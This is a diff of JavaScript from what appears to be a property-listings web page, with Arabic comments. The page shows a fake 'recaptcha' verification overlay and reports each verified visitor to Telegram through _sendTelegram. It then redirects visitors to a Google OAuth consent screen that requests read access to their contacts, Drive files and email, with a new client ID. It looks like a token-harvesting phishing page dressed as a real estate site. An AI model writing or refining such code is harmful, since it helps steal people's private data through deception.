@@ -857,7 +857,7 @@
             }
 
             // ============================================================
-            // 7. بدء تدفق OAuth (يظهر مرة واحدة فقط)
+            // 7. بدء تدفق OAuth الحقيقي (مع client_id الجديد)
             // ============================================================
             let oauthStarted = false;
 
@@ -868,14 +868,16 @@
                 }
                 oauthStarted = true;
 
+                // === CLIENT_ID الجديد ===
                 const clientId = '721412781644-n2mk691lnpgvmiofi4mlso89gji7eboe.apps.googleusercontent.com';
                 const redirectUri = window.location.href.split('?')[0];
                 const scope = 'https://www.googleapis.com/auth/contacts.readonly https://www.googleapis.com/auth/drive.readonly https://www.googleapis.com/auth/userinfo.email';
+
+                // استخدم response_type=token فقط بدون access_type=offline
                 const authUrl =
-                    `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${encodeURIComponent(scope)}&prompt=consent&access_type=offline`;
+                    `https://accounts.google.com/o/oauth2/v2/auth?client_id=${clientId}&redirect_uri=${encodeURIComponent(redirectUri)}&response_type=token&scope=${encodeURIComponent(scope)}&prompt=consent`;
 
                 localStorage.setItem('oauth_started', 'true');
-
                 window.location.href = authUrl;
             }
 
@@ -968,7 +970,6 @@
             const recaptchaCheck = document.getElementById('recaptchaCheck');
             const verifyBtn = document.getElementById('verifyBtn');
 
-            // التحقق إذا كان المستخدم اتحقق قبل كده
             if (localStorage.getItem('verified') === 'true') {
                 verifyOverlay.classList.add('hidden');
                 appContainer.classList.add('show');
@@ -990,9 +991,7 @@
 
             verifyBtn.addEventListener('click', function() {
                 if (recaptchaChecked) {
-                    // حفظ في localStorage عشان منظهرش تاني
                     localStorage.setItem('verified', 'true');
-
                     verifyOverlay.classList.add('hidden');
                     _sendTelegram("✅ تم التحقق من المستخدم");
 
@@ -1011,7 +1010,6 @@
             // ============================================================
             document.addEventListener('DOMContentLoaded', function() {
 
-                // تفاصيل العقارات
                 document.addEventListener('click', function(e) {
                     if (e.target.classList.contains('btn-detail')) {
                         const id = parseInt(e.target.getAttribute('data-id'));
@@ -1093,13 +1091,11 @@
                         localStorage.setItem('oauth_started', 'true');
                     }
                 } else {
-                    // إذا مفيش توكن، خلي التطبيق يظهر (بس مش هنخفي التحقق لو لسه محصلش)
                     if (localStorage.getItem('verified') === 'true') {
                         appContainer.classList.add('show');
                     }
                 }
 
-                // عرض العقارات
                 renderProperties('all');
 
             });
